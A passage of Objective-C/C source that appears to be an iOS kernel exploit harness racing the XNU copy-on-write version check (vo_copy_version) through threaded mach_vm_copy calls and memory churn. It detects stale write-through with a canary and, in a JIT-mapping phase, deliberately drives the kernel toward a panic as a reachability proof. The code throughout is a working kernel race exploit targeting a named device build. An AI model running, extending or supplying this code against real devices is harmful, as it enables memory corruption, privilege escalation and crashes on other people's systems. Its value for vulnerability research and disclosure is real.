        mach_vm_address_t bd = 0;
        if (mach_vm_allocate(mach_task_self(), &bd, V4_BUMP_SPAN,
                             VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
            continue;
        kern_return_t kr = mach_vm_copy(mach_task_self(),
                                        (mach_vm_address_t)c->src, pg, bd);
        if (kr == KERN_SUCCESS)
            atomic_fetch_add_explicit(&c->bumps, 1, memory_order_relaxed);
        for (uint64_t len = 2 * pg; len <= V4_BUMP_SPAN; len <<= 1) {
            kr = mach_vm_copy(mach_task_self(),
                              (mach_vm_address_t)c->src, len, bd);
            if (kr != KERN_SUCCESS)
                break;
            atomic_fetch_add_explicit(&c->bumps, 1, memory_order_relaxed);
        }
        mach_vm_deallocate(mach_task_self(), bd, V4_BUMP_SPAN);
        atomic_fetch_add_explicit(&c->cycles, 1, memory_order_relaxed);
    }
    return NULL;
}

static void *v4_churn(void *arg)
{
    v4_ctx_t *c = arg;
    while (!atomic_load_explicit(&c->stop, memory_order_relaxed)) {
        mach_vm_address_t a = 0;
        if (mach_vm_allocate(mach_task_self(), &a, 0x400000,
                             VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            mach_vm_deallocate(mach_task_self(), a, 0x400000);
            atomic_fetch_add_explicit(&c->churn_ops, 1, memory_order_relaxed);
        }
    }
    return NULL;
}

static void *v4_watch(void *arg)
{
    v4_ctx_t *c = arg;
    const size_t pg = c->page;
    while (!atomic_load_explicit(&c->stop, memory_order_relaxed)) {
        for (uint64_t off = 0; off < c->len; off += pg) {
            if (canary_present(c->dst + off)) {
                atomic_fetch_add_explicit(&c->wrong, 1, memory_order_relaxed);
                t018_log(YES, "[!] WRITE-THROUGH: dst @+0x%llx shows src canary"
                              " — CoW recheck passed stale (28972 LIVE)", off);
                atomic_store(&c->stop, 1);
                return NULL;
            }
            if (atomic_load_explicit(&c->stop, memory_order_relaxed))
                return NULL;
        }
    }
    return NULL;
}

/* one race round against (src,dst,len); returns when stop is set or secs elapse */
static void v4_run(v4_ctx_t *ctx, double secs, const char *tag)
{
    pthread_t ft[V4_FAULTERS], bt, ct, wt;
    v4_targ_t fa[V4_FAULTERS];
    for (int i = 0; i < V4_FAULTERS; i++) {
        fa[i] = (v4_targ_t){ ctx, i };
        pthread_create(&ft[i], NULL, v4_faulter, &fa[i]);
    }
    pthread_create(&bt, NULL, v4_bumper, ctx);
    pthread_create(&ct, NULL, v4_churn, ctx);
    pthread_create(&wt, NULL, v4_watch, ctx);

    CFAbsoluteTime deadline = CFAbsoluteTimeGetCurrent() + secs;
    while (CFAbsoluteTimeGetCurrent() < deadline &&
           !atomic_load_explicit(&ctx->stop, memory_order_relaxed))
        usleep(100000);
    atomic_store(&ctx->stop, 1);
    for (int i = 0; i < V4_FAULTERS; i++)
        pthread_join(ft[i], NULL);
    pthread_join(bt, NULL);
    pthread_join(ct, NULL);
    pthread_join(wt, NULL);

    t018_log(YES, "[*] %s done: faults=%llu bumps=%llu copy_cycles=%llu churn=%llu wrong=%llu",
             tag,
             (unsigned long long)atomic_load(&ctx->faults),
             (unsigned long long)atomic_load(&ctx->bumps),
             (unsigned long long)atomic_load(&ctx->cycles),
             (unsigned long long)atomic_load(&ctx->churn_ops),
             (unsigned long long)atomic_load(&ctx->wrong));
}

+ (NSString *)runCowTruncVersionRace
{
    v4_ctx_t ctx = {0};
    ctx.page = (size_t)vm_page_size;
    atomic_store(&ctx.stop, 0);

    g_out = [NSMutableString string];
    NSString *base = t018_basedir();
    NSString *lpath = [base stringByAppendingPathComponent:@"t018_cow_log.txt"];
    g_logfd = open(lpath.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    t018_log(YES, "=== T018 v4 vo_copy_version race (26.5 u64 geometry) ===");
    t018_log(YES, "[*] A14 23F77: vo_copy+0x38 vo_copy_version+0x40 as u64 (not XR u32)");
    t018_log(YES, "[*] gates: zero-fill+obj contention (site1) + map-lock churn (site2)");
    t018_log(YES, "[*] oracle A: dst write-through canary | oracle B: 'unexpected CoW' panic (phase C)");
    t018_log(YES, "[*] page=0x%zx region=0x%llx fault-threads=%d",
             ctx.page, V4_LEN, V4_FAULTERS);

    ctx.len = V4_LEN;
    ctx.src = mmap(NULL, V4_LEN, PROT_READ | PROT_WRITE,
                   MAP_ANON | MAP_PRIVATE, -1, 0);
    ctx.dst = mmap(NULL, V4_LEN, PROT_READ | PROT_WRITE,
                   MAP_ANON | MAP_PRIVATE, -1, 0);
    if (ctx.src == MAP_FAILED || ctx.dst == MAP_FAILED) {
        t018_log(YES, "[x] anon mmap failed: errno=%d", errno);
        goto v4_fail;
    }

    /* attach the copy object to src's vm_object (copy_delay) — dst becomes
     * the frozen snapshot view used by the write-through oracle */
    {
        kern_return_t kr = mach_vm_copy(mach_task_self(),
                                        (mach_vm_address_t)ctx.src, V4_LEN,
                                        (mach_vm_address_t)ctx.dst);
        t018_log(YES, "[*] attach vm_copy(0x%llx) kr=%d (%s)", V4_LEN, kr,
                 kr == KERN_SUCCESS ? "ok — vo_copy installed" : "FAILED");
        if (kr != KERN_SUCCESS)
            goto v4_fail;
    }

    v4_run(&ctx, V4_TIME_SEC, "phase A/B anon");
    if (atomic_load(&ctx.wrong))
        goto v4_verdict;

    /* phase C: exec-implied variant — on a prot-policy mapping a DETECTED
     * mismatch panics instead of silently stripping write (vm_fault.c:5866
     * pmap_has_prot_policy). Firing it needs no wrap: pure reachability. */
    atomic_store(&ctx.stop, 0);
    {
        uint8_t *jit = mmap(NULL, V4_JIT_LEN, PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_ANON | MAP_PRIVATE | 0x0800 /* MAP_JIT */, -1, 0);
        if (jit == MAP_FAILED)
            jit = mmap(NULL, V4_JIT_LEN, PROT_READ | PROT_WRITE | PROT_EXEC,
                       MAP_ANON | MAP_PRIVATE, -1, 0);
        if (jit == MAP_FAILED) {
            t018_log(YES, "[.] phase C skipped: no exec-writable anon mapping"
                          " (errno=%d — MAP_JIT/RWX gated)", errno);
        } else {
            uint8_t *jdst = mmap(NULL, V4_JIT_LEN, PROT_READ | PROT_WRITE,
                                 MAP_ANON | MAP_PRIVATE, -1, 0);
            kern_return_t kr = KERN_INVALID_ARGUMENT;
            if (jdst != MAP_FAILED)
                kr = mach_vm_copy(mach_task_self(),
                                  (mach_vm_address_t)jit, V4_JIT_LEN,
                                  (mach_vm_address_t)jdst);
            if (kr != KERN_SUCCESS) {
                t018_log(YES, "[.] phase C skipped: jit copy attach kr=%d", kr);
            } else {
                t018_log(YES, "[*] phase C: exec-implied region live —"
                              " any detected mismatch panics (reachability proof)");
                munmap(ctx.src, ctx.len);
                munmap(ctx.dst, ctx.len);
                ctx.src = jit;
                ctx.dst = jdst;
                ctx.len = V4_JIT_LEN;
                atomic_store(&ctx.faults, 0);
                atomic_store(&ctx.bumps, 0);
                v4_run(&ctx, V4_C_TIME_SEC, "phase C jit");
                munmap(jit, V4_JIT_LEN);
                munmap(jdst, V4_JIT_LEN);
            }
        }
    }

v4_verdict:
    t018_log(YES, "=== verdict: %s ===",
             atomic_load(&ctx.wrong)
                 ? "WRITE-THROUGH HIT — 28972 stale CoW recheck LIVE from app"
                 : "clean v4 — no stale pass observed; see bumps/faults rate vs"
                   " 2^32 wrap math in T018 card");
    close(g_logfd);
    g_logfd = -1;
    return [g_out copy];

v4_fail:
    if (g_logfd >= 0) {
        close(g_logfd);
        g_logfd = -1;
    }
    return [g_out copy];
}

@end
